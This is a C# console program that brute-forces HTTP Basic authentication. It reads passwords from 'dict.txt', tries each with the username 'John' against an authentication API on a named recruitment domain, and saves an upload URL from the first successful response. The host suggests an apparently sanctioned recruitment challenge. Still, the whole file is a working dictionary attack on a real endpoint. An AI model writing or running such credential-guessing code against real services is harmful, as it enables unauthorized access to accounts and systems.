using System;
using System.IO;
using System.Net;
using System.Text;

class Program
{
    static void Main()
    {
        string username = "John";
        string url = "http://recruitment.warpdevelopment.co.za/api/authenticate";
        string dictionaryFile = "dict.txt";
        string uploadUrl = "";

        Console.WriteLine("Starting brute-force authentication...");

        // Check if the password file exists
        if (!File.Exists(dictionaryFile))
        {
            Console.WriteLine("Error: Password file 'dict.txt' not found!");
            Console.WriteLine("Make sure 'dict.txt' is in the same directory as 'Program.cs'.");
            Console.ReadLine();
            return;
        }

        // Read password list
        string[] passwords = File.ReadAllLines(dictionaryFile);
        if (passwords.Length == 0)
        {
            Console.WriteLine("Error: Password file is empty!");
            Console.ReadLine();
            return;
        }

        foreach (string password in passwords)
        {
            Console.WriteLine($"Trying password: {password}");

            // Encode username:password in Base64
            string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes($"{username}:{password}"));
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            request.Headers["Authorization"] = "Basic " + credentials;

            try
            {
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                    {
                        string responseText = reader.ReadToEnd();
                        Console.WriteLine($"API Response: {responseText}");

                        // Extract the upload URL from JSON response
                        uploadUrl = ExtractUploadUrl(responseText);
                        Console.WriteLine($"Extracted Upload URL: {uploadUrl}");

                        if (!string.IsNullOrEmpty(uploadUrl))
                        {
                            File.WriteAllText("upload_url.txt", uploadUrl);
                            Console.WriteLine("Upload URL saved to upload_url.txt.");
                        }

                        break; // Exit loop on success
                    }
                }
            }
            catch (WebException ex)
            {
                if (ex.Response != null)
                {
                    using (StreamReader reader = new StreamReader(ex.Response.GetResponseStream()))
                    {
                        string errorResponse = reader.ReadToEnd();
                        Console.WriteLine($"Error Response: {errorResponse}");
                    }
                }
                else
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
            }
        }

        if (string.IsNullOrEmpty(uploadUrl))
        {
            Console.WriteLine("Error: Upload URL not found!");
        }

        Console.WriteLine("Press Enter to exit.");
        Console.ReadLine();
    }

    static string ExtractUploadUrl(string jsonResponse)
    {
        int start = jsonResponse.IndexOf("http");
        int end = jsonResponse.IndexOf("\"", start);
        if (start != -1 && end != -1)
        {
            return jsonResponse.Substring(start, end - start);
        }
        return "";
    }
}
